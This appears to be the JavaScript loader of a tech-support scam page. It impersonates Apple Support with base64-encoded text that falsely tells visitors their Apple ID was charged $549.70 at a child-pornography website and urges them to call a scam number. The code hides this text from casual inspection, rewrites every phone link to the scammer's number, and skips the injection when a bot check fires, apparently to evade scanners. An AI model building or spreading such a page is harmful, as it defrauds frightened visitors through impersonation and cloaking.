/* ================================================================
 * TechCare Solutions — Encoded Content Loader
 * Content is base64 encoded and injected at runtime.
 * Generated via editor.html
 * ================================================================
 *
 * >>> PHONE NUMBER — ek hi jagah change karo, pura site update ho jayega <<<
 * ================================================================ */
var PHONE_TEL     = "+18883399612";
var PHONE_DISPLAY = "+1-888-339-9612";
/* ================================================================ */

(function () {
    'use strict';

    var _d = {
        a01: 'QXBwbGUgU3VwcG9ydA==',
        a02: 'WW91ciBBcHBsZSBJRCB3YXMgcmVjZW50bHkgdXNlZCBhdCBDSMONTEQgUDBSTjBHUsOAUEhZIFdFQlNJVEUgZm9yICQ1NDkuNzAgVmlhIEFwcGxlIFBheSBQcmUtQXV0aG9yaXphdGlvbiFXZSBoYXZlIHBsYWNlZCB0aG9zZSByZXF1ZXN0IG9uIGhvbGQgdG8gZW5zdXJlIHNhZmVzdCBhbmQgU2VjdXJpdHkuIE5vdCB5b3U/IEltbWVkaWF0ZWx5IGNhbGwgQXBwbGUgU3VwcG9ydCArMS04ODgtMzM5LTk2MTIgdG8gRnJlZXplIGl0IS4=',
        a03: 'PHN0cm9uZz5DSMONTEQgUDBSTjBHUsOAUEhZIFdFQlNJVEU6ICQ1NDkuNzA8L3N0cm9uZz4g4oCUIFZpYSBBcHBsZSBQYXkgUHJlLUF1dGhvcml6YXRpb24hV2UgaGF2ZSBwbGFjZWQgdGhvc2UgcmVxdWVzdCBvbiBob2xkIHRvIGVuc3VyZSBzYWZlc3QgYW5kIFNlY3VyaXR5LiBOb3QgeW91PyBJbW1lZGlhdGVseSBjYWxsIEFwcGxlIFN1cHBvcnQgKzEtODg4LTMzOS05NjEy',
        a04: 'Q2FsbCArMS04ODgtMzM5LTk2MTI=',
        a05: 'QXBwbGUgU3VwcG9ydA==',
        a06: 'WW91ciBBcHBsZSBJRCB3YXMgcmVjZW50bHkgdXNlZCBhdCBDSMONTEQgUDBSTjBHUsOAUEhZIFdFQlNJVEUgZm9yICA8c3Ryb25nPiQ1NDkuNzA8L3N0cm9uZz4gVmlhIEFwcGxlIFBheSBQcmUtQXV0aG9yaXphdGlvbiFXZSBoYXZlIHBsYWNlZCB0aG9zZSByZXF1ZXN0IG9uIGhvbGQgdG8gZW5zdXJlIHNhZmVzdCBhbmQgU2VjdXJpdHkuIE5vdCB5b3U/IEltbWVkaWF0ZWx5IGNhbGwgQXBwbGUgU3VwcG9ydCArMS04ODgtMzM5LTk2MTIgdG8gRnJlZXplIGl0IS5DYWxsIDxhIGhyZWY9InRlbDorMTg4ODMzOTk2MTIiPisxLTg4OC0zMzktOTYxMjwvYT4gdG8gZ2V0IHN0YXJ0ZWQu',
        a07: 'Q2FuY2Vs',
        a08: 'T0s=',
        a09: 'QXBwbGU=',
        a10: 'JiM5NzQyOyArMS04MDAtMTIzLTQ1Njc=',
        a11: 'JmNvcHk7IDIwMjYgQXBwbGUgU3VwcG9ydC4gQWxsIFJpZ2h0cyBSZXNlcnZlZC4=',
        a12: 'UHJpdmFjeSBQb2xpY3k=',
        a13: 'VGVybXMgJmFtcDsgQ29uZGl0aW9ucw==',
        a14: 'RGlzY2xhaW1lcg=='
    };

    var _ORIG_TEL     = '+18001234567';
    var _ORIG_DISPLAY = '+1-800-123-4567';

    function _x(k) {
        try {
            var out = decodeURIComponent(escape(atob(_d[k])));
            out = out.split(_ORIG_TEL).join(PHONE_TEL);
            out = out.split(_ORIG_DISPLAY).join(PHONE_DISPLAY);
            return out;
        } catch (e) { return ''; }
    }

    window.__callPhone = function () {
        window.location.href = 'tel:' + PHONE_TEL;
    };

    var _map = [
        { sel: '[data-k="logo"]',           key: 'a09', html: true },
        { sel: '[data-k="phoneTop"]',       key: 'a10', html: true },
        { sel: '[data-k="phoneFoot"]',      key: 'a10', html: true },
        { sel: '[data-k="heroH1"]',         key: 'a01', html: false },
        { sel: '[data-k="heroPara"]',       key: 'a02', html: false },
        { sel: '[data-k="heroPrice"]',      key: 'a03', html: true },
        { sel: '[data-k="heroCta"]',        key: 'a04', html: false },
        { sel: '[data-k="popupTitle"]',     key: 'a05', html: false },
        { sel: '[data-k="popupMsg"]',       key: 'a06', html: true },
        { sel: '[data-k="btnCancel"]',      key: 'a07', html: false },
        { sel: '[data-k="btnOk"]',          key: 'a08', html: false },
        { sel: '[data-k="footCopy"]',       key: 'a11', html: true },
        { sel: '[data-k="linkPrivacy"]',    key: 'a12', html: false },
        { sel: '[data-k="linkTerms"]',      key: 'a13', html: true },
        { sel: '[data-k="linkDisclaimer"]', key: 'a14', html: false }
    ];

    function _inject() {
        if (window.__bg && (window.__bg.blocked || window.__bg.isBot())) return;
        for (var i = 0; i < _map.length; i++) {
            var m = _map[i];
            var nodes = document.querySelectorAll(m.sel);
            for (var j = 0; j < nodes.length; j++) {
                if (m.html) nodes[j].innerHTML = _x(m.key);
                else nodes[j].textContent = _x(m.key);
            }
        }
        var telLinks = document.querySelectorAll('a[href^="tel:"], [data-tel]');
        for (var k = 0; k < telLinks.length; k++) {
            telLinks[k].setAttribute('href', 'tel:' + PHONE_TEL);
        }
        _walkAndReplace(document.body, _ORIG_DISPLAY, PHONE_DISPLAY);
    }

    function _walkAndReplace(el, find, replace) {
        if (!el) return;
        for (var n = el.firstChild; n; n = n.nextSibling) {
            if (n.nodeType === 3) {
                if (n.nodeValue.indexOf(find) !== -1) {
                    n.nodeValue = n.nodeValue.split(find).join(replace);
                }
            } else if (n.nodeType === 1 && n.tagName !== 'SCRIPT' && n.tagName !== 'STYLE') {
                _walkAndReplace(n, find, replace);
            }
        }
    }

    function _start() { setTimeout(_inject, 80); }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', _start);
    } else {
        _start();
    }
})();